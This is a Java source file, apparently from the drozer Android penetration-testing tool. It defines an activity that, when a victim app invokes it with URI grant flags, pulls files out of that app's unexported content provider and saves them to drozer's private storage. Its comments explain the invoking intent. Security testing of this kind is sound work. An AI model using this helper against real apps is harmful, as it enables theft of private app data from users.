package com.WithSecure.dz.helpers;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;

public class IntentProxyToContentProvider extends Activity {
    
    // This class is meant to help download files from unexported Content Providers
    // Assuming the unexported Content Provider has GrantURIPermissions set to True
    // Make sure the victim app is calling this activity
    // 
    // Example of what the victim app should be doing:
    // Intent intent = new Intent();
    // intent.setComponent(new ComponentName("com.mwr.dz", "com.mwr.dz.helpers.IntentProxyToContentProvider");
    // intent.setFlags(195);
    // intent.setData(Uri.parse("content://<unexported content provider>");
    // startActivity(intent);
    //
    // Any file downloaded will be saved to Drozer's private file directory
    // /data/data/com.mwr.dz/files/<file>
    
    String filename = "yayoutputyay"; // save file as "yayoutputyay"

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Uri uri = Uri.parse(getIntent().getDataString()); // Get the Uri for the unexported content provider
        if (getIntent().getStringExtra("filename") != null) {
            filename = getIntent().getStringExtra("filename"); // if intent has String extra "filename", save file as this name
        }
        try {
            InputStream input = getContentResolver().openInputStream(uri); // Reach out to the unexported Content Provider
            File file = new File(getFilesDir(), filename); // make local file
            FileOutputStream output = new FileOutputStream(file); // also make local file
            try {
                byte[] buf = new byte[1024];
                int len;
                while ((len = input.read(buf)) > 0) {
                    output.write(buf, 0, len); // write local file from the file pulled from content provider
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    if (input != null)
                        input.close();
                    if (output != null)
                        output.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }
}
